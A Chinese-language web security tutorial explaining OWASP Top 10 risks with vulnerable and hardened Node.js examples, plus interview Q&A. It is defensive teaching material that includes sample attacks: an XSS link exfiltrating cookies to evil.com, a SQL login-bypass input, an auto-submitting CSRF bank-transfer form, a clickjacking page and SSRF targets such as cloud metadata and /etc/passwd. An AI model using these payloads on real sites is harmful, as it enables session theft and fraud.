---
title: Web 安全基础
description: 掌握OWASP Top 10常见漏洞及其防护方法
track: security
section: web-security
difficulty: intermediate
tags:
  - Web安全
  - OWASP
  - XSS
  - SQL注入
status: imported
origin: old/src/content/docs/security/web-security-fundamentals.zh.md
divergence: 0.208
issues:
  - missing-subcategory-en
  - order-mismatch
  - category-casing
legacy:
  category: Security
  subcategory: Web Security
  order: 1
  lastUpdated: 2026-01-07
---

Web 安全是现代互联网应用开发中最关键的领域之一。随着网络攻击手段的不断演进，开发者必须深入理解各类安全威胁及其防护措施，才能构建出真正安全可靠的应用程序。本文将系统性地介绍 Web 安全的核心概念、常见漏洞类型以及最佳防护实践。

## 核心概念

### 什么是 Web 安全

Web 安全是指保护网站、Web 应用程序和 Web 服务免受各种网络威胁的实践和技术集合。它涵盖了从前端到后端、从网络传输到数据存储的全方位安全防护。

Web 安全的三大核心目标（CIA 三元组）：

- **机密性（Confidentiality）**：确保敏感信息只能被授权用户访问
- **完整性（Integrity）**：确保数据在传输和存储过程中不被篡改
- **可用性（Availability）**：确保系统和服务持续可用

### 安全威胁模型

在进行安全分析时，我们需要考虑以下威胁来源：

```
┌─────────────────────────────────────────────────────────┐
│                    威胁来源分类                           │
├─────────────────────────────────────────────────────────┤
│  外部攻击者     │  恶意用户、黑客、竞争对手                  │
│  内部威胁       │  恶意员工、误操作                         │
│  自动化攻击     │  机器人、爬虫、DDoS                       │
│  供应链攻击     │  第三方库漏洞、依赖注入                    │
└─────────────────────────────────────────────────────────┘
```

## OWASP Top 10 详解

OWASP（Open Web Application Security Project）是一个专注于提高软件安全性的非营利组织。OWASP Top 10 是最权威的 Web 应用安全风险排名，每隔几年更新一次。

### 2021 版 OWASP Top 10 概览

| 排名 | 风险类别 | 描述 |
|------|----------|------|
| A01 | 失效的访问控制 | 用户可以执行超出其权限的操作 |
| A02 | 加密机制失效 | 敏感数据暴露、弱加密算法 |
| A03 | 注入攻击 | SQL、NoSQL、OS 命令注入等 |
| A04 | 不安全设计 | 架构和设计层面的安全缺陷 |
| A05 | 安全配置错误 | 默认配置、不当权限设置 |
| A06 | 易受攻击和过时的组件 | 使用已知漏洞的第三方库 |
| A07 | 身份识别和认证失败 | 弱密码、会话管理不当 |
| A08 | 软件和数据完整性故障 | 不安全的 CI/CD、未验证的更新 |
| A09 | 安全日志和监控失败 | 缺乏有效的日志记录和告警 |
| A10 | 服务端请求伪造(SSRF) | 服务器端发起恶意请求 |

### A01: 失效的访问控制

访问控制确保用户只能访问其被授权的资源。常见的访问控制漏洞包括：

```javascript
// 危险示例：直接使用用户输入的 ID 查询数据
app.get('/api/user/:id', (req, res) => {
  const userId = req.params.id;
  // 没有验证当前用户是否有权访问该用户数据
  const user = db.users.findById(userId);
  res.json(user);
});

// 安全示例：验证访问权限
app.get('/api/user/:id', authenticate, (req, res) => {
  const userId = req.params.id;
  const currentUser = req.user;

  // 只允许用户访问自己的数据或管理员访问所有数据
  if (currentUser.id !== userId && !currentUser.isAdmin) {
    return res.status(403).json({ error: '无权访问' });
  }

  const user = db.users.findById(userId);
  res.json(user);
});
```

### A02: 加密机制失效

保护敏感数据需要正确使用加密技术：

```javascript
const crypto = require('crypto');
const bcrypt = require('bcrypt');

// 密码哈希 - 使用 bcrypt
async function hashPassword(password) {
  const saltRounds = 12;
  return await bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

// 对称加密 - 使用 AES-256-GCM
function encrypt(text, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return {
    iv: iv.toString('hex'),
    encrypted: encrypted,
    authTag: authTag.toString('hex')
  };
}

function decrypt(encryptedData, key) {
  const decipher = crypto.createDecipheriv(
    'aes-256-gcm',
    key,
    Buffer.from(encryptedData.iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(encryptedData.authTag, 'hex'));

  let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

## XSS 攻击与防护

跨站脚本攻击（Cross-Site Scripting，XSS）是最常见的 Web 安全漏洞之一。攻击者通过在网页中注入恶意脚本，当其他用户访问该页面时，脚本会在用户浏览器中执行。

### XSS 攻击类型

#### 反射型 XSS（Reflected XSS）

反射型 XSS 的恶意脚本来自当前 HTTP 请求，通常通过 URL 参数传递：

```javascript
// 危险示例：直接将 URL 参数插入页面（不要这样做！）
// URL: https://example.com/search?q=<script>alert('XSS')</script>
// 如果直接将 q 参数渲染到页面，会导致脚本执行

// 攻击者构造的恶意链接示例：
// https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

#### 存储型 XSS（Stored XSS）

存储型 XSS 的恶意脚本被永久存储在目标服务器上：

```javascript
// 危险示例：用户评论未经过滤直接存储和显示
app.post('/api/comments', (req, res) => {
  const comment = req.body.comment;
  // 直接存储用户输入（危险！）
  db.comments.insert({ text: comment, userId: req.user.id });
  res.json({ success: true });
});

// 如果前端直接渲染未过滤的评论内容，会导致 XSS
```

#### DOM 型 XSS（DOM-based XSS）

DOM 型 XSS 完全在客户端发生，恶意脚本通过修改 DOM 环境执行：

```javascript
// 危险示例：使用不安全的 DOM 操作（不要这样做！）
// 如果直接将 URL hash 插入 DOM，攻击者可以构造：
// https://example.com/page#<img src=x onerror="alert('XSS')">
```

### XSS 防护措施

#### 输出编码

```javascript
// HTML 实体编码
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, char => map[char]);
}

// JavaScript 字符串编码
function escapeJs(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r');
}

// URL 编码
function escapeUrl(text) {
  return encodeURIComponent(text);
}
```

#### 使用安全的 DOM API

```javascript
// 安全：使用 textContent 设置纯文本
element.textContent = userInput;

// 安全：使用 DOM API 创建元素
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);

// 安全：使用 setAttribute 设置属性
element.setAttribute('data-value', userInput);

// 如果必须处理 HTML，使用 DOMPurify 等库进行净化
const clean = DOMPurify.sanitize(dirtyHtml);
```

#### Content Security Policy（CSP）

```javascript
// Express.js 中配置 CSP
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-randomNonce123'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    frameSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));
```

```html
<!-- HTML 中使用 nonce -->
<script nonce="randomNonce123">
  // 只有带有正确 nonce 的脚本才能执行
  console.log('This script is allowed');
</script>
```

## SQL 注入与防护

SQL 注入是通过在用户输入中插入恶意 SQL 代码，从而操纵数据库查询的攻击方式。

### SQL 注入攻击示例

```javascript
// 危险示例：字符串拼接构造 SQL（绝对不要这样做！）
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;

  // 极其危险！攻击者可以输入：
  // username: admin' --
  // password: anything
  // 这会绕过密码验证

  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  // 上面的代码仅用于演示漏洞，实际开发中绝对禁止
});
```

### SQL 注入防护措施

#### 参数化查询（Prepared Statements）

```javascript
// MySQL - 使用参数化查询
const mysql = require('mysql2/promise');

async function login(username, password) {
  const connection = await mysql.createConnection(config);

  // 安全：使用占位符
  const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
  );

  return rows;
}

// PostgreSQL - 使用参数化查询
const { Pool } = require('pg');
const pool = new Pool(config);

async function getUser(userId) {
  // 安全：使用 $1, $2 等占位符
  const result = await pool.query(
    'SELECT * FROM users WHERE id = $1',
    [userId]
  );
  return result.rows[0];
}
```

#### ORM 框架

```javascript
// 使用 Sequelize ORM
const { User } = require('./models');

async function findUser(username) {
  // ORM 自动处理参数化
  const user = await User.findOne({
    where: { username: username }
  });
  return user;
}

// 使用 Prisma ORM
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient();

async function getUsers(role) {
  const users = await prisma.user.findMany({
    where: { role: role }
  });
  return users;
}
```

#### 输入验证

```javascript
const Joi = require('joi');

// 定义验证模式
const userSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),

  email: Joi.string()
    .email()
    .required(),

  age: Joi.number()
    .integer()
    .min(0)
    .max(150)
});

// 验证输入
function validateUser(userData) {
  const { error, value } = userSchema.validate(userData);

  if (error) {
    throw new Error(`验证失败: ${error.details[0].message}`);
  }

  return value;
}
```

## CSRF 防护

跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种攻击者诱导用户在已认证的 Web 应用中执行非预期操作的攻击方式。

### CSRF 攻击原理

```html
<!-- 攻击者网站上的恶意页面 -->
<html>
<body>
  <h1>恭喜您中奖了！</h1>

  <!-- 隐藏的表单自动提交 -->
  <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none;">
    <input name="to" value="attacker-account">
    <input name="amount" value="10000">
  </form>

  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

### CSRF 防护措施

#### CSRF Token

```javascript
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// 在表单中包含 CSRF token
app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// 验证 CSRF token
app.post('/transfer', (req, res) => {
  // csurf 中间件自动验证 token
  // 如果验证失败会抛出错误
  processTransfer(req.body);
  res.json({ success: true });
});
```

```html
<!-- 表单模板 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <input type="text" name="to" placeholder="收款账户">
  <input type="number" name="amount" placeholder="金额">
  <button type="submit">转账</button>
</form>
```

#### SameSite Cookie 属性

```javascript
// 设置 SameSite Cookie
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,  // 仅 HTTPS
    sameSite: 'strict',  // 或 'lax'
    maxAge: 24 * 60 * 60 * 1000  // 24小时
  }
}));
```

#### 验证 Origin/Referer 头

```javascript
function validateOrigin(req, res, next) {
  const origin = req.headers.origin;
  const referer = req.headers.referer;

  const allowedOrigins = ['https://example.com', 'https://www.example.com'];

  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: '非法请求来源' });
  }

  if (referer) {
    const refererOrigin = new URL(referer).origin;
    if (!allowedOrigins.includes(refererOrigin)) {
      return res.status(403).json({ error: '非法请求来源' });
    }
  }

  next();
}

app.post('/api/*', validateOrigin);
```

## SSRF 攻击

服务端请求伪造（Server-Side Request Forgery，SSRF）允许攻击者诱导服务器向内部或外部系统发起请求。

### SSRF 攻击示例

```javascript
// 危险示例：允许用户指定任意 URL（不要这样做！）
app.get('/api/fetch', async (req, res) => {
  const url = req.query.url;

  // 攻击者可以请求内部服务，例如：
  // ?url=http://169.254.169.254/latest/meta-data/（云元数据）
  // ?url=http://localhost:6379/（内部Redis）
  // ?url=file:///etc/passwd（本地文件）

  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});
```

### SSRF 防护措施

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

// 安全的 URL 获取函数
async function safeFetch(userUrl) {
  // 1. 解析 URL
  let parsedUrl;
  try {
    parsedUrl = new URL(userUrl);
  } catch (e) {
    throw new Error('无效的 URL');
  }

  // 2. 只允许 HTTP/HTTPS 协议
  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    throw new Error('只允许 HTTP/HTTPS 协议');
  }

  // 3. 白名单域名检查
  const allowedDomains = ['api.example.com', 'cdn.example.com'];
  if (!allowedDomains.includes(parsedUrl.hostname)) {
    throw new Error('不允许的域名');
  }

  // 4. DNS 解析检查（防止 DNS 重绑定）
  const addresses = await dns.resolve4(parsedUrl.hostname);

  for (const addr of addresses) {
    const ip = ipaddr.parse(addr);

    // 检查是否为私有/保留 IP
    if (ip.range() !== 'unicast') {
      throw new Error('不允许访问内部地址');
    }

    // 检查是否为本地地址
    const privateRanges = [
      '10.0.0.0/8',
      '172.16.0.0/12',
      '192.168.0.0/16',
      '127.0.0.0/8',
      '169.254.0.0/16'
    ];

    for (const range of privateRanges) {
      if (ip.match(ipaddr.parseCIDR(range))) {
        throw new Error('不允许访问私有地址');
      }
    }
  }

  // 5. 发起请求
  const response = await fetch(userUrl, {
    timeout: 5000,
    redirect: 'error'  // 禁止重定向
  });

  return response;
}
```

## 点击劫持

点击劫持（Clickjacking）是一种视觉欺骗攻击，攻击者将目标网站嵌入透明的 iframe 中，诱导用户点击。

### 点击劫持攻击示例

```html
<!-- 攻击者网站 -->
<html>
<head>
  <style>
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;  /* 透明 */
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <h1>点击这里领取奖品！</h1>
    <button>立即领取</button>
  </div>

  <!-- 透明的目标网站 iframe -->
  <iframe src="https://bank.com/transfer?to=attacker&amount=10000"></iframe>
</body>
</html>
```

### 点击劫持防护

```javascript
// 1. X-Frame-Options 头
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  // 或 'SAMEORIGIN' 允许同源嵌入
  next();
});

// 2. Content-Security-Policy frame-ancestors
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'none'"]
    // 或 ["'self'"] 允许同源
    // 或 ["'self'", "https://trusted.com"]
  }
}));
```

```javascript
// 3. JavaScript 防护（作为备用）
// 在页面加载时检查是否在 iframe 中
if (self !== top) {
  // 页面被嵌入 iframe，尝试跳出
  top.location = self.location;
}
```

## 安全头部配置

正确配置 HTTP 安全头是防御多种攻击的有效手段。

### 完整的安全头部配置

```javascript
const helmet = require('helmet');

app.use(helmet());

// 或者手动配置每个头部
app.use((req, res, next) => {
  // 防止 XSS
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // 防止 MIME 类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // 防止点击劫持
  res.setHeader('X-Frame-Options', 'DENY');

  // 控制 Referer 信息
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // 强制 HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');

  // 限制浏览器功能
  res.setHeader('Permissions-Policy',
    'accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()');

  // 内容安全策略
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'nonce-randomValue'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'"
  );

  next();
});
```

### 安全头部检查清单

| 头部 | 作用 | 推荐值 |
|------|------|--------|
| Content-Security-Policy | 防止 XSS、数据注入 | 根据需求配置 |
| Strict-Transport-Security | 强制 HTTPS | max-age=31536000; includeSubDomains |
| X-Content-Type-Options | 防止 MIME 嗅探 | nosniff |
| X-Frame-Options | 防止点击劫持 | DENY 或 SAMEORIGIN |
| X-XSS-Protection | XSS 过滤器 | 1; mode=block |
| Referrer-Policy | 控制 Referer | strict-origin-when-cross-origin |
| Permissions-Policy | 限制浏览器功能 | 禁用不需要的 API |

## 安全编码实践

### 输入验证

```javascript
const validator = require('validator');

// 综合输入验证函数
function validateInput(input, type) {
  if (typeof input !== 'string') {
    return { valid: false, error: '输入必须是字符串' };
  }

  // 去除首尾空白
  input = input.trim();

  // 长度检查
  if (input.length === 0) {
    return { valid: false, error: '输入不能为空' };
  }

  if (input.length > 10000) {
    return { valid: false, error: '输入过长' };
  }

  switch (type) {
    case 'email':
      if (!validator.isEmail(input)) {
        return { valid: false, error: '无效的邮箱格式' };
      }
      break;

    case 'url':
      if (!validator.isURL(input, {
        protocols: ['http', 'https'],
        require_protocol: true
      })) {
        return { valid: false, error: '无效的 URL' };
      }
      break;

    case 'alphanumeric':
      if (!validator.isAlphanumeric(input)) {
        return { valid: false, error: '只允许字母和数字' };
      }
      break;

    case 'integer':
      if (!validator.isInt(input)) {
        return { valid: false, error: '必须是整数' };
      }
      break;
  }

  return { valid: true, value: input };
}
```

### 安全的文件上传

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');

// 配置文件上传
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, '/secure/uploads/');
  },
  filename: (req, file, cb) => {
    // 生成随机文件名，防止路径遍历
    const randomName = crypto.randomBytes(32).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `${randomName}${ext}`);
  }
});

// 文件过滤
const fileFilter = (req, file, cb) => {
  // 允许的 MIME 类型
  const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];

  // 允许的扩展名
  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif'];

  const ext = path.extname(file.originalname).toLowerCase();

  if (allowedMimes.includes(file.mimetype) && allowedExts.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error('不允许的文件类型'), false);
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB
    files: 1
  }
});

// 上传后验证文件内容
const fileType = require('file-type');
const fs = require('fs').promises;

async function validateFileContent(filePath) {
  const buffer = await fs.readFile(filePath);
  const type = await fileType.fromBuffer(buffer);

  if (!type || !['image/jpeg', 'image/png', 'image/gif'].includes(type.mime)) {
    await fs.unlink(filePath);
    throw new Error('文件内容与扩展名不匹配');
  }

  return true;
}
```

### 安全的会话管理

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const redis = require('redis');

const redisClient = redis.createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,  // 使用环境变量
  name: 'sessionId',  // 自定义 cookie 名称
  resave: false,
  saveUninitialized: false,
  rolling: true,  // 每次请求重置过期时间
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 30 * 60 * 1000,  // 30分钟
    domain: '.example.com',
    path: '/'
  }
}));

// 登录时重新生成会话 ID（防止会话固定攻击）
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    // 重新生成会话 ID
    req.session.regenerate((err) => {
      if (err) {
        return res.status(500).json({ error: '会话创建失败' });
      }

      req.session.userId = user.id;
      req.session.loginTime = Date.now();

      res.json({ success: true });
    });
  }
});

// 登出时销毁会话
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    res.clearCookie('sessionId');
    res.json({ success: true });
  });
});
```

### 错误处理与日志

```javascript
const winston = require('winston');

// 配置日志记录器
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'security.log', level: 'warn' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// 安全事件日志
function logSecurityEvent(event, req, details = {}) {
  logger.warn({
    event: event,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    userId: req.session?.userId,
    path: req.path,
    method: req.method,
    timestamp: new Date().toISOString(),
    ...details
  });
}

// 全局错误处理
app.use((err, req, res, next) => {
  // 记录错误
  logger.error({
    message: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    ip: req.ip
  });

  // 不向用户暴露详细错误信息
  res.status(500).json({
    error: '服务器内部错误',
    requestId: req.id  // 用于追踪
  });
});

// 监控可疑活动
function detectSuspiciousActivity(req, res, next) {
  const suspiciousPatterns = [
    /(<script|javascript:|on\w+=)/i,  // XSS 尝试
    /(union.*select|or.*1.*=.*1)/i,   // SQL 注入尝试
    /(\.\.\/|\.\.\\)/,                 // 路径遍历
  ];

  const input = JSON.stringify(req.body) + JSON.stringify(req.query);

  for (const pattern of suspiciousPatterns) {
    if (pattern.test(input)) {
      logSecurityEvent('SUSPICIOUS_INPUT', req, { pattern: pattern.toString() });
      break;
    }
  }

  next();
}
```

## 代码示例：完整的安全中间件

```javascript
// security-middleware.js
const rateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');
const helmet = require('helmet');
const hpp = require('hpp');
const mongoSanitize = require('express-mongo-sanitize');

function setupSecurityMiddleware(app) {
  // 1. 基本安全头部
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"]
      }
    },
    crossOriginEmbedderPolicy: true,
    crossOriginOpenerPolicy: true,
    crossOriginResourcePolicy: { policy: "same-site" },
    dnsPrefetchControl: true,
    frameguard: { action: 'deny' },
    hidePoweredBy: true,
    hsts: true,
    ieNoOpen: true,
    noSniff: true,
    originAgentCluster: true,
    permittedCrossDomainPolicies: true,
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    xssFilter: true
  }));

  // 2. 速率限制
  const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15分钟
    max: 100,  // 每个 IP 100 次请求
    message: { error: '请求过于频繁，请稍后再试' },
    standardHeaders: true,
    legacyHeaders: false
  });

  app.use('/api/', limiter);

  // 3. 登录接口更严格的限制
  const loginLimiter = rateLimit({
    windowMs: 60 * 60 * 1000,  // 1小时
    max: 5,  // 5次尝试
    message: { error: '登录尝试次数过多，请1小时后再试' }
  });

  app.use('/api/login', loginLimiter);

  // 4. 慢速请求（渐进式延迟）
  const speedLimiter = slowDown({
    windowMs: 15 * 60 * 1000,
    delayAfter: 50,
    delayMs: () => 500
  });

  app.use(speedLimiter);

  // 5. HTTP 参数污染防护
  app.use(hpp());

  // 6. NoSQL 注入防护
  app.use(mongoSanitize());

  // 7. 请求大小限制
  app.use(express.json({ limit: '10kb' }));
  app.use(express.urlencoded({ extended: true, limit: '10kb' }));

  // 8. 信任代理（如果在代理后面）
  app.set('trust proxy', 1);

  return app;
}

module.exports = setupSecurityMiddleware;
```

## 面试要点

### 常见面试问题及答案

**Q1: 什么是 XSS 攻击？如何防护？**

A: XSS（跨站脚本攻击）是攻击者在网页中注入恶意脚本的攻击方式。分为三种类型：
- 反射型：恶意脚本通过 URL 参数传递
- 存储型：恶意脚本存储在服务器数据库中
- DOM 型：完全在客户端发生

防护措施：
1. 输出编码（HTML/JS/URL 编码）
2. 使用安全的 DOM API（textContent 而非不安全的方法）
3. 配置 Content-Security-Policy
4. 设置 HttpOnly Cookie
5. 输入验证和过滤

**Q2: CSRF 和 XSS 的区别是什么？**

A:
- XSS：攻击者在目标网站注入代码，代码在用户浏览器执行，窃取用户数据
- CSRF：攻击者诱导用户访问恶意页面，利用用户已有的登录状态执行非预期操作

关键区别：XSS 利用用户对网站的信任，CSRF 利用网站对用户的信任

**Q3: 如何防止 SQL 注入？**

A:
1. 使用参数化查询/预编译语句
2. 使用 ORM 框架
3. 输入验证和类型检查
4. 最小权限原则（数据库用户权限）
5. 转义特殊字符（最后手段）

**Q4: 解释一下 CSP（Content-Security-Policy）**

A: CSP 是一个 HTTP 响应头，用于声明哪些动态资源可以被加载和执行。主要指令：
- default-src：默认策略
- script-src：JavaScript 来源
- style-src：CSS 来源
- img-src：图片来源
- connect-src：XHR/Fetch 目标
- frame-ancestors：谁可以嵌入此页面

**Q5: 什么是 SSRF？如何防护？**

A: SSRF（服务端请求伪造）是攻击者诱导服务器向内部或外部系统发起请求的攻击。

防护措施：
1. 白名单验证允许的域名
2. 禁止请求私有 IP 地址
3. 禁用不必要的协议（file://、gopher://）
4. DNS 解析后再次验证 IP
5. 限制响应内容类型

### 核心知识点

```
┌────────────────────────────────────────────────────────────────┐
│                    Web 安全核心知识体系                          │
├────────────────────────────────────────────────────────────────┤
│  注入攻击                                                       │
│  ├── SQL 注入 → 参数化查询                                      │
│  ├── NoSQL 注入 → 输入过滤                                      │
│  ├── 命令注入 → 避免 shell 执行                                  │
│  └── XSS → 输出编码 + CSP                                       │
├────────────────────────────────────────────────────────────────┤
│  认证与授权                                                      │
│  ├── 会话管理 → 安全 Cookie 配置                                 │
│  ├── CSRF → Token + SameSite                                   │
│  ├── 访问控制 → RBAC/ABAC                                       │
│  └── JWT → 安全签名 + 短期有效                                   │
├────────────────────────────────────────────────────────────────┤
│  数据保护                                                        │
│  ├── 传输安全 → HTTPS + HSTS                                    │
│  ├── 存储安全 → 加密 + 哈希                                      │
│  └── 日志安全 → 脱敏 + 审计                                      │
├────────────────────────────────────────────────────────────────┤
│  配置安全                                                        │
│  ├── 安全头部 → Helmet                                          │
│  ├── CORS → 严格配置                                            │
│  └── 依赖安全 → 定期更新                                         │
└────────────────────────────────────────────────────────────────┘
```

## 延伸阅读

### 官方资源

- [OWASP 官方网站](https://owasp.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

### 工具与框架

- [OWASP ZAP](https://www.zaproxy.org/) - 开源 Web 安全扫描器
- [Burp Suite](https://portswigger.net/burp) - 专业 Web 安全测试工具
- [Helmet.js](https://helmetjs.github.io/) - Express 安全中间件
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) - 依赖漏洞扫描

### 学习平台

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - 免费在线实验室
- [Hack The Box](https://www.hackthebox.com/) - 渗透测试练习平台
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - 故意存在漏洞的学习应用

### 进阶主题

- **API 安全**：OAuth 2.0、API 网关、速率限制
- **容器安全**：Docker 安全配置、Kubernetes 安全
- **云安全**：AWS/Azure/GCP 安全最佳实践
- **DevSecOps**：安全左移、自动化安全测试、SAST/DAST

## 总结

Web 安全是一个持续演进的领域，需要开发者保持警惕并不断学习。本文介绍的 OWASP Top 10 涵盖了最常见的安全风险，掌握这些知识是构建安全 Web 应用的基础。

关键要点：
1. **纵深防御**：不要依赖单一安全措施
2. **最小权限**：只授予必要的权限
3. **默认安全**：安全配置应该是默认选项
4. **持续监控**：及时发现和响应安全事件
5. **安全更新**：定期更新依赖和系统组件

安全不是一次性的工作，而是需要融入整个软件开发生命周期的持续实践。
